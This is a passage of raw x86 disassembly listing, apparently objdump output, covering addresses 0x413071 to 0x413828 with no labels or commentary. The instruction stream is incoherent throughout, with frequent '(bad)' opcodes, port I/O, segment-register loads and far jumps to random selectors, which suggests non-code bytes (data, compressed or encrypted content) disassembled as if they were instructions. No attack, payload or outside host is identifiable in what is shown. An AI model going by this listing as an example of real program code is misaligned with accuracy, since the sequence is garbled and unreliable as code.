  413071:	and    eax,DWORD PTR [ecx]
  413073:	imul   esp,esi,0x27
  413076:	or     al,0xde
  413078:	jecxz  0x413011
  41307a:	pop    ss
  41307b:	int3   
  41307c:	sti    
  41307d:	(bad)  
  41307f:	imul   edi,DWORD PTR [ebp+0x69],0xffffffbe
  413083:	aaa    
  413084:	push   0x7dd72b67
  413089:	rcl    DWORD PTR [edi+0x11e23c23],cl
  41308f:	in     eax,0x35
  413091:	addr16 xchg eax,ecx
  413094:	jmp    0x41304b
  413096:	adc    DWORD PTR [edx],edi
  413098:	xor    eax,0xfb3ebd82
  41309d:	outs   dx,DWORD PTR ds:[esi]
  41309e:	mov    dh,0x1c
  4130a0:	lahf   
  4130a1:	jle    0x4130f8
  4130a3:	popa   
  4130a4:	daa    
  4130a5:	inc    esp
  4130a6:	fbld   TBYTE PTR [ecx-0x69]
  4130a9:	outs   dx,BYTE PTR ds:[esi]
  4130aa:	sti    
  4130ab:	not    DWORD PTR [ecx]
  4130ad:	add    edi,ebx
  4130af:	lds    edx,FWORD PTR ds:0xb68bc2d7
  4130b5:	pop    ds
  4130b6:	pop    DWORD PTR [ebx-0x47]
  4130b9:	lds    eax,FWORD PTR [ebx+ebx*8-0x6f]
  4130bd:	jb     0x413132
  4130bf:	lea    ebx,[ebx+0x4a7f940b]
  4130c5:	cmp    BYTE PTR [edx+0x6b536550],al
  4130cb:	adc    eax,0x66411323
  4130d0:	jns    0x4130aa
  4130d2:	sar    BYTE PTR [edx],0xeb
  4130d5:	mov    ah,BYTE PTR [ebp-0x1f]
  4130d8:	pusha  
  4130d9:	(bad)  
  4130da:	push   edi
  4130db:	jb     0x4130a3
  4130dd:	or     eax,0x35bf7c05
  4130e2:	push   ecx
  4130e3:	(bad)  
  4130e4:	adc    al,0x55
  4130e6:	test   DWORD PTR [edi+ebx*4],esp
  4130e9:	xor    BYTE PTR [ebx-0x77],ah
  4130ec:	fiadd  WORD PTR [eax+edx*8+0x36f64921]
  4130f3:	pop    es
  4130f4:	shr    BYTE PTR [edx-0x64],1
  4130f7:	pop    ebx
  4130f8:	ficom  WORD PTR [esi-0x62]
  4130fb:	std    
  4130fc:	or     DWORD PTR [ebp+0x3b],edx
  4130ff:	stos   BYTE PTR es:[edi],al
  413100:	aam    0x74
  413102:	adc    BYTE PTR [ebx-0x12],0x16
  413106:	jl     0x4130a6
  413108:	inc    ecx
  413109:	jge    0x41314d
  41310b:	xchg   esi,eax
  41310c:	pop    ebp
  41310d:	sbb    al,0xcb
  41310f:	lods   eax,DWORD PTR ds:[esi]
  413110:	adc    eax,0x7052d79c
  413115:	daa    
  413116:	inc    esi
  413117:	sub    dh,BYTE PTR [edi-0x243d8e27]
  41311d:	mov    edi,0x5bacf63e
  413122:	(bad)  
  413123:	shr    BYTE PTR [eax+esi*4-0x23],cl
  413127:	in     al,dx
  413128:	sti    
  413129:	xlat   BYTE PTR ds:[ebx]
  41312a:	jg     0x413193
  41312c:	dec    edi
  41312d:	push   esp
  41312e:	in     al,dx
  41312f:	lds    esi,FWORD PTR [edi]
  413131:	sti    
  413132:	daa    
  413133:	jae    0x4130c3
  413135:	sbb    dl,BYTE PTR [ebp+0x46]
  413138:	push   ds
  413139:	addr16 adc al,0x53
  41313c:	scas   eax,DWORD PTR es:[edi]
  41313d:	inc    ebx
  41313e:	or     dl,cl
  413140:	outs   dx,BYTE PTR ds:[esi]
  413141:	cmp    eax,0x50cd0fff
  413146:	lods   eax,DWORD PTR ds:[esi]
  413147:	xchg   ecx,eax
  413148:	mov    ebx,0xcff178d5
  41314d:	pushf  
  41314e:	stos   BYTE PTR es:[edi],al
  41314f:	stc    
  413150:	push   edx
  413151:	in     eax,0xd1
  413153:	pop    ecx
  413154:	popa   
  413155:	data16 data16 jge 0x4131c6
  413159:	xchg   edx,eax
  41315a:	(bad)  
  41315b:	hlt    
  41315c:	mov    esi,0xe79029c9
  413161:	fidiv  DWORD PTR [ecx+0x47f37999]
  413167:	pop    eax
  413168:	adc    ah,bl
  41316a:	ficomp DWORD PTR [ebp+ebx*4-0x3fff2d68]
  413171:	cwde   
  413172:	jbe    0x4130f4
  413174:	popa   
  413175:	or     BYTE PTR [ebp+0x59],ah
  413178:	lea    edx,[ecx-0x23]
  41317b:	cs daa 
  41317d:	cmp    edi,ebx
  41317f:	add    ebx,DWORD PTR [edx]
  413181:	inc    ecx
  413182:	pop    esp
  413183:	mov    al,ds:0x6efa81a2
  413188:	adc    DWORD PTR [esp+eax*1-0x49da6e4a],esi
  41318f:	test   edx,esp
  413191:	inc    ebx
  413192:	xlat   BYTE PTR ds:[ebx]
  413193:	sub    BYTE PTR [ecx+0x6b],dl
  413196:	mov    ?,esp
  413198:	sub    al,0xc9
  41319a:	test   al,0xe5
  41319c:	test   BYTE PTR [ecx],bh
  41319e:	adc    BYTE PTR ds:0xb00bd2d8,bl
  4131a4:	cdq    
  4131a5:	or     dh,BYTE PTR [ebx]
  4131a7:	push   esp
  4131a8:	jb     0x413229
  4131aa:	push   esi
  4131ab:	dec    ebx
  4131ac:	or     BYTE PTR [edi+0x68],ah
  4131af:	nop
  4131b0:	nop
  4131b1:	scas   al,BYTE PTR es:[edi]
  4131b2:	adc    eax,0xe70dfdd0
  4131b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131b8:	ds stos BYTE PTR es:[edi],al
  4131ba:	aaa    
  4131bb:	or     esp,DWORD PTR [eax-0x3c]
  4131be:	test   BYTE PTR [ebp+0x71e8211f],0x2
  4131c5:	das    
  4131c6:	pop    esi
  4131c7:	aam    0x45
  4131c9:	pop    esi
  4131ca:	into   
  4131cb:	mov    al,ds:0xcc572f15
  4131d0:	mov    bh,0x72
  4131d2:	cwde   
  4131d3:	xchg   edi,eax
  4131d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131d5:	mov    dh,0x27
  4131d7:	int    0x65
  4131d9:	xchg   edi,eax
  4131da:	call   0xd63b:0x17b83081
  4131e1:	(bad)  
  4131e2:	xchg   BYTE PTR es:[ebp-0x190214c3],al
  4131e9:	jns    0x413206
  4131eb:	xchg   ecx,eax
  4131ec:	fidivr WORD PTR [ecx+ecx*4-0x14]
  4131f0:	loop   0x41323a
  4131f2:	dec    ebx
  4131f3:	retf   
  4131f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131f5:	pop    ebx
  4131f6:	test   eax,0xc0249c38
  4131fb:	iret   
  4131fc:	shl    BYTE PTR [edx+0x7a],1
  4131ff:	mov    edx,0xf0e76c5c
  413204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413205:	jl     0x4131ac
  413207:	push   cs
  413208:	xchg   esi,eax
  413209:	xchg   esi,eax
  41320a:	jp     0x413251
  41320c:	fmul   st,st(4)
  41320e:	nop
  41320f:	leave  
  413210:	cs pop es
  413212:	cwde   
  413213:	push   eax
  413214:	in     al,0xe7
  413216:	push   ebp
  413217:	mov    edi,0x75f9ed7c
  41321c:	push   0x8d974855
  413221:	mov    eax,ds:0xecd7286e
  413226:	add    esi,DWORD PTR ds:0x11e681f5
  41322c:	out    0xb1,eax
  41322e:	mov    bl,0xd3
  413230:	inc    DWORD PTR [edx]
  413232:	aad    0x7
  413234:	sub    BYTE PTR [ebp+ebp*4-0x11],cl
  413238:	xchg   edx,eax
  413239:	jns    0x4132ae
  41323b:	jne    0x4131be
  41323d:	sub    eax,0xaaca46e2
  413242:	mov    dh,0xf0
  413244:	mov    bl,0x26
  413246:	mov    BYTE PTR [edi-0x2441f21f],dh
  41324c:	mov    esp,0x5ddf647b
  413251:	or     dh,bh
  413253:	outs   dx,BYTE PTR ds:[esi]
  413254:	(bad)  
  413255:	sub    ebp,esp
  413257:	jbe    0x4132c7
  413259:	test   al,0xfd
  41325b:	fild   WORD PTR [ebx-0x2f24b566]
  413261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413262:	gs div edi
  413265:	ret    0x1625
  413268:	mov    eax,0x57a91209
  41326d:	push   ebp
  41326e:	in     eax,dx
  41326f:	mov    cs,WORD PTR [edx+ecx*8+0x5b]
  413273:	enter  0x36f1,0x14
  413277:	xor    DWORD PTR [edi-0x73],ebp
  41327a:	test   al,0xbd
  41327c:	push   0xcdf74b16
  413281:	ds dec ebp
  413283:	pop    es
  413284:	outs   dx,DWORD PTR ds:[esi]
  413285:	xor    al,0xb2
  413287:	cmp    edi,esi
  413289:	mov    cs,WORD PTR [ebp-0x1bca5db1]
  41328f:	mov    dl,0x65
  413291:	jo     0x413253
  413293:	push   ebx
  413294:	shl    DWORD PTR [ebp+0x1ba88b69],1
  41329a:	loopne 0x413239
  41329c:	popf   
  41329d:	xor    DWORD PTR [eax+0x13],edi
  4132a0:	mov    eax,ds:0x5f8b53e0
  4132a5:	add    ebp,ecx
  4132a7:	dec    edx
  4132a8:	mov    dh,0xd0
  4132aa:	sub    eax,0xfda49dfb
  4132af:	push   edx
  4132b0:	(bad)
  4132b5:	and    DWORD PTR [esp+eax*8+0x294dcf7e],esp
  4132bc:	mov    dl,0xb9
  4132be:	pop    ebx
  4132bf:	pop    ds
  4132c0:	mov    WORD PTR [edi+0x3],fs
  4132c3:	xchg   esp,eax
  4132c4:	lods   eax,DWORD PTR ds:[esi]
  4132c5:	add    al,0xfe
  4132c7:	pop    ebp
  4132c8:	xchg   dh,bl
  4132ca:	not    cl
  4132cc:	mov    ch,0x50
  4132ce:	aad    0xd1
  4132d0:	add    al,0xfd
  4132d2:	test   BYTE PTR [eax+0x64],dh
  4132d5:	push   edx
  4132d6:	js     0x413318
  4132d8:	push   eax
  4132d9:	arpl   WORD PTR [edi],si
  4132db:	add    DWORD PTR [ecx+ecx*4],0x363c4481
  4132e2:	mov    ch,BYTE PTR ds:0x2ed1f234
  4132e8:	cmp    ebp,DWORD PTR [ebx]
  4132ea:	sbb    ebx,DWORD PTR [ebp-0x560b99e8]
  4132f0:	cmp    BYTE PTR [edx-0x62],0x3a
  4132f4:	nop
  4132f5:	js     0x413308
  4132f7:	fild   QWORD PTR [eax+ebp*2+0x63]
  4132fb:	int    0x3f
  4132fd:	add    BYTE PTR [edx-0x72266b5f],0xfb
  413304:	sub    al,0xb7
  413306:	cmp    eax,0xef8c3d25
  41330b:	clc    
  41330c:	not    BYTE PTR [edi+ebp*8+0xb]
  413310:	cmp    DWORD PTR [ecx],edi
  413312:	mov    WORD PTR [ecx+0x1d],cs
  413315:	xchg   ecx,eax
  413316:	pusha  
  413317:	jns    0x413361
  413319:	in     al,0x39
  41331b:	retf   0x92dd
  41331e:	adc    BYTE PTR [ebp+0x21c0a35f],cl
  413324:	dec    edi
  413325:	aaa    
  413326:	sahf   
  413327:	ret    
  413328:	stos   DWORD PTR es:[edi],eax
  413329:	pop    ebx
  41332a:	and    eax,0xbb8ff6b1
  41332f:	ror    BYTE PTR [esi+0x435e257b],0x25
  413336:	enter  0xaa1e,0x4f
  41333a:	or     BYTE PTR [ecx],ch
  41333c:	add    al,0x15
  41333e:	bound  edx,QWORD PTR [edi+0x28]
  413341:	sbb    DWORD PTR [eax],esp
  413343:	in     al,dx
  413344:	xchg   esp,eax
  413345:	(bad)  
  413346:	sti    
  413347:	add    DWORD PTR [bp+si+0x50],edi
  41334b:	sbb    al,0x32
  41334d:	ret    
  41334e:	loop   0x4132ed
  413350:	outs   dx,BYTE PTR ds:[esi]
  413351:	mov    ch,0xe7
  413353:	push   0x5b
  413355:	scas   eax,DWORD PTR es:[edi]
  413356:	fistp  QWORD PTR [edx+0xd61bf5c]
  41335c:	ja     0x413359
  41335e:	mov    dl,0x38
  413360:	psrlw  mm7,QWORD PTR [edx+0x12]
  413364:	cmc    
  413365:	iret   
  413366:	and    bl,BYTE PTR [ecx+ecx*8-0x7648e9fa]
  41336d:	sub    edi,ebp
  41336f:	jge    0x4133bc
  413371:	sub    ecx,DWORD PTR [eax]
  413373:	and    eax,0xf44bc899
  413378:	jg     0x413398
  41337a:	iret   
  41337b:	and    al,0xfa
  41337d:	adc    BYTE PTR [bx+si-0xbb7],bl
  413382:	(bad)  
  413383:	xchg   esp,eax
  413384:	mov    esp,0x13ca31f7
  413389:	adc    BYTE PTR [ebx+0x5b],0xa1
  41338d:	or     al,0xea
  41338f:	push   0x6e
  413391:	pop    eax
  413392:	cdq    
  413393:	xor    DWORD PTR [ebx-0x719c2a3a],edx
  413399:	leave  
  41339a:	sti    
  41339b:	int    0x7
  41339d:	ret    0x7a73
  4133a0:	aaa    
  4133a1:	dec    ebx
  4133a2:	stos   BYTE PTR es:[edi],al
  4133a3:	ja     0x4133d4
  4133a5:	retf   
  4133a6:	push   esp
  4133a7:	mov    al,0x19
  4133a9:	aam    0xf5
  4133ab:	ficom  WORD PTR [ebx]
  4133ad:	mov    esi,0x57ce9ef
  4133b2:	rcl    BYTE PTR [esi-0x1e],cl
  4133b5:	dec    ebx
  4133b6:	xchg   dh,bh
  4133b8:	fmul   st,st(5)
  4133ba:	push   edi
  4133bb:	cld    
  4133bc:	mov    al,0xda
  4133be:	jmp    0xb174:0x212c657c
  4133c5:	xchg   ebx,eax
  4133c6:	std    
  4133c7:	rcl    DWORD PTR ds:0xf6ddb313,1
  4133cd:	mov    al,0x4c
  4133cf:	push   eax
  4133d0:	sbb    ah,BYTE PTR [edx+0x6144380f]
  4133d6:	jmp    DWORD PTR [edi]
  4133d8:	xchg   ebx,eax
  4133d9:	cli    
  4133da:	repnz pop eax
  4133dc:	cli    
  4133dd:	and    BYTE PTR [ecx],bh
  4133df:	and    ecx,edx
  4133e1:	mov    dh,0xe1
  4133e3:	xchg   esi,eax
  4133e4:	dec    edx
  4133e5:	or     al,0xfc
  4133e7:	mov    al,ds:0xc672bb76
  4133ec:	and    ebx,DWORD PTR [ebx+0x49]
  4133ef:	xor    BYTE PTR [ebx+0x6157f4d5],0xbf
  4133f6:	inc    ebp
  4133f7:	lea    eax,[edx]
  4133f9:	into   
  4133fa:	fiadd  DWORD PTR [ebx]
  4133fc:	popf   
  4133fd:	shr    BYTE PTR [edx],0x83
  413400:	ficom  DWORD PTR [esi-0x73]
  413403:	mov    gs,ebx
  413405:	jecxz  0x4133c6
  413407:	adc    eax,0xe514a19a
  41340c:	addr16 test eax,0xf4b6d9d
  413412:	mov    ds:0x2f7cb10f,al
  413417:	or     BYTE PTR [ebx],cl
  413419:	inc    eax
  41341a:	inc    edx
  41341b:	ret    0x6241
  41341e:	mov    eax,0xde8e4ab4
  413423:	add    bl,BYTE PTR [ebx]
  413425:	ss dec ebp
  413427:	push   esi
  413428:	es int3 
  41342a:	enter  0x4a3d,0xc8
  41342e:	js     0x4133d7
  413430:	out    dx,eax
  413431:	dec    esi
  413432:	mov    cl,0x10
  413434:	pusha  
  413435:	ins    BYTE PTR es:[edi],dx
  413436:	ja     0x413453
  413438:	cld    
  413439:	inc    edx
  41343a:	inc    eax
  41343b:	out    dx,eax
  41343c:	sbb    dl,bh
  41343e:	inc    ebp
  41343f:	jge    0x4133fa
  413441:	sub    BYTE PTR [edx],al
  413443:	repnz cmp eax,0x77a8e1c0
  413449:	sar    bh,1
  41344b:	jno    0x4134a3
  41344d:	xchg   edi,eax
  41344e:	push   edx
  41344f:	inc    edx
  413450:	mov    edx,0x6bc061cc
  413455:	sbb    BYTE PTR [ebp+0x2f03d708],0x7c
  41345c:	push   edx
  41345d:	mov    edx,DWORD PTR [esi]
  41345f:	out    dx,eax
  413460:	repz mov fs:0xd40f0893,eax
  413467:	xchg   DWORD PTR [eax-0x1e6f527d],esp
  41346d:	call   0xcdd5701c
  413472:	stos   BYTE PTR es:[edi],al
  413473:	jno    0x4134d5
  413475:	(bad)  
  413476:	loop   0x413428
  413478:	arpl   di,bp
  41347a:	jle    0x413439
  41347c:	aad    0x72
  41347e:	mov    edx,edi
  413480:	aaa    
  413481:	push   ebp
  413482:	push   eax
  413483:	xor    BYTE PTR [edx],bl
  413485:	fidiv  DWORD PTR [ebp+esi*2+0x76]
  41348a:	jmp    0x4134cd
  41348c:	cmp    DWORD PTR [edi+0x1f],0x2ecdd15c
  413493:	pop    edx
  413494:	jne    0x41341a
  413496:	iret   
  413497:	jmp    0x413457
  413499:	fidiv  DWORD PTR [ecx+0x4b4d79d8]
  41349f:	std    
  4134a0:	mov    esi,0x79f6a46a
  4134a5:	jbe    0x413491
  4134a7:	rcr    dl,cl
  4134a9:	cmp    ch,BYTE PTR [eax]
  4134ab:	pop    esi
  4134ac:	dec    edx
  4134ad:	fdiv   st,st(6)
  4134af:	loopne 0x41343a
  4134b1:	dec    esi
  4134b2:	das    
  4134b3:	imul   ecx,ebp,0xffffffc4
  4134b6:	mov    edi,0xef01ff84
  4134bb:	xchg   eax,ebp
  4134bd:	xchg   edi,eax
  4134be:	push   es
  4134bf:	jmp    0x6a69:0x9f52600b
  4134c6:	sub    ah,ah
  4134c8:	mov    dh,0xa2
  4134ca:	imul   edx,DWORD PTR [edx+0x3ce41a21],0xffffffee
  4134d1:	jl     0x41347f
  4134d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134d4:	das    
  4134d5:	cmc    
  4134d6:	rol    BYTE PTR [ebx+0x1],0xc5
  4134da:	sbb    eax,DWORD PTR [edx]
  4134dc:	xor    DWORD PTR ds:0x2a65d9b8,eax
  4134e2:	test   eax,0xb65d20b4
  4134e7:	into   
  4134e8:	xchg   BYTE PTR [ebp-0x4de87672],bh
  4134ee:	pop    eax
  4134ef:	jae    0x413530
  4134f1:	add    eax,0xb6da8ad8
  4134f6:	push   cs
  4134f7:	adc    cl,BYTE PTR [ebx+0x2c]
  4134fa:	sub    al,0x1c
  4134fc:	pop    eax
  4134fd:	nop
  4134fe:	stos   DWORD PTR es:[edi],eax
  4134ff:	inc    esi
  413500:	push   0xffffff98
  413502:	test   BYTE PTR [ebx],dl
  413504:	dec    ecx
  413505:	fcmovnbe st,st(2)
  413508:	rol    ebp,0xad
  41350b:	dec    edi
  41350c:	sahf   
  41350d:	push   esp
  41350e:	push   edi
  41350f:	pusha  
  413510:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413511:	(bad)  
  413512:	sbb    al,bl
  413514:	(bad)  
  413515:	sti    
  413516:	in     eax,dx
  413517:	popa   
  413518:	jmp    0x30eef536
  41351d:	mov    WORD PTR [edx-0x346b53ce],ds
  413523:	mov    ah,0xe1
  413525:	sbb    eax,0x3e8c07ca
  41352a:	add    edx,esp
  41352c:	int    0x64
  41352e:	out    dx,eax
  41352f:	and    BYTE PTR [edx],cl
  413531:	mov    dl,0x6
  413533:	push   0xffffffe1
  413535:	dec    ebp
  413536:	cli    
  413537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413538:	(bad)  
  413539:	sahf   
  41353a:	sbb    al,0x5
  41353c:	addr16 sub al,0xc8
  41353f:	fild   QWORD PTR [ecx]
  413541:	mov    eax,ds:0x49e48100
  413546:	(bad)  
  413547:	adc    esi,DWORD PTR [eax-0x5c8156f5]
  41354d:	adc    DWORD PTR [esi],edx
  41354f:	enter  0xa53b,0x39
  413553:	dec    esp
  413554:	jo     0x413566
  413556:	mov    es,esi
  413558:	and    ebp,0x503f459e
  41355e:	ror    al,1
  413560:	push   cs
  413561:	sbb    eax,DWORD PTR [esi+eiz*4+0x14]
  413565:	jle    0x41352c
  413567:	aam    0x4b
  413569:	dec    ebx
  41356a:	mov    DWORD PTR [ecx+0xf],esp
  41356d:	int    0x7e
  41356f:	mov    esi,0x6be7b8c6
  413574:	or     BYTE PTR [edi+0x192759ea],0xe5
  41357b:	(bad)  
  41357c:	in     al,0x6d
  41357e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41357f:	shr    dh,0x74
  413582:	ficomp WORD PTR [edi+0x67]
  413585:	ret    
  413586:	jle    0x41359f
  413588:	jp     0x41356b
  41358a:	xchg   BYTE PTR [ebp+0x25],dh
  41358d:	push   edi
  41358e:	dec    esp
  41358f:	test   DWORD PTR [ebx-0x10821610],edi
  413595:	pop    ss
  413596:	inc    ebp
  413597:	cmp    bh,bl
  413599:	lea    esp,[edx-0x5d]
  41359c:	jecxz  0x4135cf
  41359e:	in     al,dx
  41359f:	and    eax,0xd169fbe7
  4135a4:	or     BYTE PTR [ebp-0x40],ah
  4135a7:	push   0xffffffc2
  4135a9:	push   ebx
  4135aa:	xchg   esp,eax
  4135ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135ac:	in     eax,0xa8
  4135ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135af:	ror    esi,1
  4135b1:	sub    DWORD PTR [ebx+0x20],ebx
  4135b4:	sub    esp,ebx
  4135b6:	sub    al,0x79
  4135b8:	fs xchg ebx,eax
  4135ba:	jbe    0x41359c
  4135bc:	mov    bh,0x68
  4135be:	or     edx,DWORD PTR [ecx+0x7ec2d1bc]
  4135c4:	cmp    ah,BYTE PTR [esi]
  4135c6:	in     al,0xa7
  4135c8:	cmp    BYTE PTR [ebx-0x62],0xe9
  4135cc:	cli    
  4135cd:	daa    
  4135ce:	sub    BYTE PTR [edx+0x49],0xca
  4135d2:	push   cs
  4135d3:	stos   DWORD PTR es:[edi],eax
  4135d4:	adc    eax,0x97607504
  4135d9:	mov    esi,0xdcd89bff
  4135de:	stos   DWORD PTR es:[edi],eax
  4135df:	sbb    BYTE PTR [edx-0x2d],bh
  4135e2:	in     al,0x1e
  4135e4:	imul   eax,DWORD PTR [edi-0x2e],0xffffff9b
  4135e8:	ffreep st(3)
  4135ea:	int3   
  4135eb:	js     0x4135f0
  4135ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135ee:	or     al,0x15
  4135f0:	cmp    BYTE PTR [esi],ah
  4135f2:	or     ch,BYTE PTR [edi+0x6f]
  4135f5:	mov    dh,0xf9
  4135f7:	mov    ds:0x27b8b57b,al
  4135fc:	sbb    ch,BYTE PTR [edi]
  4135fe:	jmp    0x3799:0x390bbe11
  413605:	lock pop ecx
  413607:	loope  0x4135cb
  413609:	repz mov ecx,0x8efb8640
  41360f:	inc    edx
  413610:	icebp  
  413611:	jle    0x413609
  413613:	ds cmp eax,0x592f6024
  413619:	xchg   esi,eax
  41361a:	push   es
  41361b:	sub    eax,0x437669ca
  413620:	and    BYTE PTR [ebx+eax*1-0x75569833],cl
  413627:	add    eax,0x98e93dec
  41362c:	div    DWORD PTR [ebx+ecx*1+0x5f16aa16]
  413633:	leave  
  413634:	mov    esi,0xc341875b
  413639:	xlat   BYTE PTR ds:[ebx]
  41363a:	fcmovbe st,st(1)
  41363c:	dec    BYTE PTR [ebx+0x35d60d7a]
  413642:	add    ebp,edi
  413644:	ds in  al,dx
  413646:	fdivr  DWORD PTR [edx+0x5b4698fa]
  41364c:	ss out dx,eax
  41364e:	in     al,0x67
  413650:	pop    ebx
  413651:	addr16 loop 0x413647
  413654:	retf   
  413655:	lea    edi,[eax]
  413657:	or     BYTE PTR [eax+0x2d8f5b1b],ch
  41365d:	fdiv   st,st(7)
  41365f:	cmp    bl,BYTE PTR [eax+0x40ec0b9]
  413665:	retf   
  413666:	fdiv   DWORD PTR gs:[ebx]
  413669:	fcomi  st,st(2)
  41366b:	fild   WORD PTR [eax-0x78]
  41366e:	imul   esi,DWORD PTR ds:0xea7fe2bc,0x320d3b62
  413678:	int    0x17
  41367a:	fcomi  st,st(7)
  41367c:	hlt    
  41367d:	push   ebx
  41367e:	cmp    DWORD PTR [esi+0xf],edi
  413681:	std    
  413682:	outs   dx,BYTE PTR ds:[esi]
  413683:	sahf   
  413684:	cmp    BYTE PTR [ebx],0x73
  413687:	and    eax,0xf568d9d4
  41368c:	cmp    al,0x71
  41368e:	ja     0x41366d
  413690:	xchg   DWORD PTR [eax+0x9],esp
  413693:	xor    dl,BYTE PTR [edi+edx*4+0x1c8466ef]
  41369a:	fdivr  DWORD PTR ds:0xd37970ab
  4136a0:	inc    edi
  4136a1:	mov    eax,0x7aea73f4
  4136a6:	xor    al,0x3f
  4136a8:	mov    edx,DWORD PTR [ecx+0x13711ac9]
  4136ae:	cmp    BYTE PTR [ebp+0x2b012bc8],0xab
  4136b5:	mov    ah,0xf2
  4136b7:	rol    DWORD PTR [esi],1
  4136b9:	fmul   st(4),st
  4136bb:	pushf  
  4136bc:	repz sbb al,0xfa
  4136bf:	je     0x4136fe
  4136c1:	push   eax
  4136c2:	xchg   ecx,eax
  4136c3:	dec    edi
  4136c4:	jl     0x4136eb
  4136c6:	lods   al,BYTE PTR ds:[esi]
  4136c7:	adc    al,0x49
  4136c9:	sti    
  4136ca:	mov    dl,0xd
  4136cc:	add    eax,0x14fd8bad
  4136d1:	jmp    0x4136dd
  4136d3:	xor    eax,0x456940a5
  4136d8:	pusha  
  4136d9:	xor    al,0xf1
  4136db:	rcl    DWORD PTR [ebx+0x57],0x3a
  4136df:	jg     0x413691
  4136e1:	mov    bl,0xc
  4136e3:	lea    ebp,[ebx-0x37]
  4136e6:	sub    esp,DWORD PTR [eax-0x4a5f50db]
  4136ec:	aam    0x73
  4136ee:	jae    0x41376d
  4136f0:	test   DWORD PTR [ebx+eax*1-0x7ca356c7],edi
  4136f7:	call   0x92b91d29
  4136fc:	mov    WORD PTR ds:0xa4701564,ss
  413702:	dec    esp
  413703:	rcl    DWORD PTR [esi-0x4e7f29ec],cl
  413709:	dec    ebx
  41370a:	pusha  
  41370b:	dec    ecx
  41370c:	inc    esi
  41370d:	int    0x83
  41370f:	(bad)  
  413710:	in     eax,0xb8
  413712:	int3   
  413713:	xor    DWORD PTR [ebp+0x43],ecx
  413716:	jae    0x4136a7
  413718:	mov    WORD PTR [edi+0x69262cd6],?
  41371e:	(bad)  
  41371f:	test   ebp,0x93c3c529
  413725:	and    ecx,DWORD PTR [ebp-0x41ef5278]
  41372b:	std    
  41372c:	std    
  41372d:	cdq    
  41372e:	xlat   BYTE PTR ds:[ebx]
  41372f:	push   edi
  413730:	jmp    0xc7c2:0xf8f76be2
  413737:	adc    eax,0x82fb8046
  41373c:	lods   al,BYTE PTR ds:[esi]
  41373d:	std    
  41373e:	fadd   DWORD PTR [eax-0x7ece475c]
  413744:	popa   
  413745:	ins    BYTE PTR es:[edi],dx
  413746:	not    BYTE PTR [ebp+0x7daeba79]
  41374c:	sub    al,0x81
  41374e:	push   0x72459495
  413753:	inc    ecx
  413754:	jmp    DWORD PTR [ecx+0x31026262]
  41375a:	dec    esp
  41375b:	mov    ebp,0xeff6cfd5
  413760:	sbb    al,0x62
  413762:	mov    dl,BYTE PTR [ecx+0x1733f3b6]
  413768:	lahf   
  413769:	push   es
  41376a:	pop    ss
  41376b:	sbb    BYTE PTR [esi],0xe
  41376e:	mov    dh,0xfe
  413770:	xor    eax,0xc078ea79
  413775:	inc    esp
  413776:	xor    al,0xe3
  413778:	inc    ebx
  413779:	cmp    DWORD PTR [esi+eiz*1],edi
  41377c:	imul   ebx,DWORD PTR [eax+0x13],0x3e
  413780:	mov    dl,0x98
  413782:	push   esp
  413783:	fwait
  413784:	xchg   esi,eax
  413785:	xchg   esi,eax
  413786:	mov    ds:0xda049cfc,al
  41378b:	daa    
  41378c:	jmp    0x4137cf
  41378e:	popa   
  41378f:	dec    esi
  413790:	lds    ebx,FWORD PTR [esi]
  413792:	aad    0xf9
  413794:	dec    ebp
  413795:	jl     0x4137e3
  413797:	jg     0x413719
  413799:	fst    st(6)
  41379b:	push   ebp
  41379c:	(bad)  
  41379d:	sbb    DWORD PTR [eax+ebx*1],esp
  4137a0:	add    DWORD PTR [ebp*2+0x791d9721],0xffffffe1
  4137a8:	es jecxz 0x41381d
  4137ab:	mov    cl,0x84
  4137ad:	retf   0x4a18
  4137b0:	push   eax
  4137b1:	fs dec esp
  4137b3:	add    BYTE PTR [ebp-0x64],ah
  4137b6:	mov    ds:0x5024fd9d,eax
  4137bb:	sar    DWORD PTR [edi+0xe4448d5],cl
  4137c1:	lods   eax,DWORD PTR ds:[esi]
  4137c2:	xlat   BYTE PTR ds:[ebx]
  4137c3:	ins    DWORD PTR es:[edi],dx
  4137c4:	xor    BYTE PTR [edx+0x6f6ba7fc],dl
  4137ca:	push   cs
  4137cb:	jae    0x41384b
  4137cd:	ins    BYTE PTR es:[edi],dx
  4137ce:	not    bh
  4137d0:	dec    esp
  4137d1:	cli    
  4137d2:	les    eax,FWORD PTR [ecx-0x76e301b4]
  4137d8:	ret    0x92aa
  4137db:	std    
  4137dc:	test   DWORD PTR [eax-0x44603b68],ebp
  4137e2:	sub    dl,BYTE PTR [esi-0x3c]
  4137e5:	mov    esp,0x2737b15b
  4137ea:	xchg   BYTE PTR [edx-0x6d],bh
  4137ed:	scas   al,BYTE PTR es:[edi]
  4137ee:	dec    eax
  4137ef:	xchg   edx,eax
  4137f0:	xor    dl,BYTE PTR [edx]
  4137f2:	xchg   ebx,eax
  4137f3:	rcr    BYTE PTR [ebx+0x2f],cl
  4137f6:	iret   
  4137f7:	xchg   edx,eax
  4137f8:	and    DWORD PTR [edx-0x7],ebx
  4137fb:	call   0xee1f:0x81ed9f20
  413802:	xlat   BYTE PTR ds:[ebx]
  413803:	inc    ecx
  413804:	fs dec edi
  413806:	jo     0x413809
  413808:	push   ss
  413809:	xchg   esp,eax
  41380a:	sub    al,0x15
  41380c:	fcmovnb st,st(4)
  41380e:	jp     0x4137bb
  413810:	sar    DWORD PTR [esi+0x2bb8071a],1
  413816:	xchg   ebp,eax
  413817:	loopne 0x41385c
  413819:	lods   eax,DWORD PTR ds:[esi]
  41381a:	and    al,0x71
  41381c:	xchg   ebp,eax
  41381d:	fistp  QWORD PTR [edx]
  41381f:	sub    DWORD PTR [ecx-0x26f346c],esi
  413825:	push   0x44
  413827:	pop    esp
  413828:	jnp    0x413870
